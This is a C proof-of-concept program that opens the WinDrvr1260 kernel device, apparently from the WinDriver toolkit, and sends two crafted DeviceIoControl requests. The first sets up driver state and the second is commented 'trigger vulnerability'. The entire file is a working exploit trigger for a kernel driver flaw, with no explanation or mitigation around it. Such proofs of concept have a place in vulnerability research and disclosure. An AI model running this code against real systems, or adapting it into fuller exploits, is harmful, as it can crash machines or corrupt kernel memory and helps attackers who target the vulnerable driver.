#include "windows.h"
#include "winioctl.h"
#include "stdio.h"


int main()
{
	DWORD dwOut, n;
	char bufOutput[0x2000];
	char bufInput[0x20];


	HANDLE hDriver = ::CreateFile(
		"\\\\.\\WinDrvr1260",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("Open device failed:%x\n", GetLastError());
		return -1;
	}

	DWORD dwRet = 0;
	DWORD nRet;
	n = 0;

	memset(bufOutput, 0x41, 0x2000);
	memset(bufInput, 0x0, 0x20);

	//
	//// set global_p + 0x9a6c not be zero
	//
	((DWORD *)bufOutput)[0] = 0x1;
	((DWORD *)bufOutput)[4] = 0x0;
	((DWORD *)bufOutput)[12] = 0x10;
	((DWORD *)bufOutput)[14] = 0x10;
	((DWORD *)bufOutput)[13] = 0x10;
	((DWORD *)bufOutput)[56] = 0x1;
	nRet = DeviceIoControl(hDriver, 0x95382677, &bufOutput, 0x2000, &bufInput, 0x20, &dwRet, NULL);



	memset(bufOutput, 0x0, 0x2000);
	memset(bufInput, 0x0, 0x20);

	//
	//// trigger vulnerability
	//
	((DWORD *)bufOutput)[0] = 0x1;
	((DWORD *)bufOutput)[4] = 0x1;
	((DWORD *)bufOutput)[3] = 0x1;
	((DWORD *)bufOutput)[5] = 0x1;
	((DWORD *)bufOutput)[6] = 0x0;
	nRet = DeviceIoControl(hDriver, 0x953826DB, &bufOutput, 0x2000, &bufInput, 0x20, &dwRet, NULL);

}